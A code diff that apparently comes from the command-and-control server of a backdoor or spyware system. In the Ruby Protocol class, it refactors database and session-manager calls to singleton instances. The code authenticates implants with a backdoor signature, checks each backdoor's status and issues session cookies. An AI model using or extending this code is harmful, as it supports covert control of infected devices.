@@ -35,7 +35,7 @@ class Protocol
 
     # decrypt the message with the per customer signature
     begin
-      message = aes_decrypt(content, DB.backdoor_signature)
+      message = aes_decrypt(content, DB.instance.backdoor_signature)
     rescue Exception => e
       trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
       return
@@ -74,7 +74,7 @@ class Protocol
     trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s
 
     # get the class key from the db
-    conf_key = DB.class_key_of build_id_real
+    conf_key = DB.instance.class_key_of build_id_real
 
     # this class does not exist
     return if conf_key.nil?
@@ -107,10 +107,10 @@ class Protocol
 
     # prepare the response:
     # Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response )
-    message = aes_encrypt(ks, DB.backdoor_signature)
+    message = aes_encrypt(ks, DB.instance.backdoor_signature)
 
     # ask the database the status of the backdoor
-    status, bid = DB.backdoor_status(build_id_real, instance_id, subtype)
+    status, bid = DB.instance.backdoor_status(build_id_real, instance_id, subtype)
 
     response = [Commands::PROTO_NO].pack('I')
     # what to do based on the backdoor status
@@ -126,7 +126,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.create(bid, build_id_real, instance_id, subtype, k)
+        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, subtype, k)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
@@ -141,7 +141,7 @@ class Protocol
   def self.valid_authentication(peer, cookie)
 
     # check if the cookie was created correctly and if it is still valid
-    valid = SessionManager.check(cookie)
+    valid = SessionManager.instance.check(cookie)
 
     if valid then
       trace :debug, "[#{peer}][#{cookie}] Authenticated"
@@ -155,7 +155,7 @@ class Protocol
   
   def self.commands(peer, cookie, content)
     # retrieve the session
-    session = SessionManager.get cookie
+    session = SessionManager.instance.get cookie
 
     # invalid session
     if session.nil?
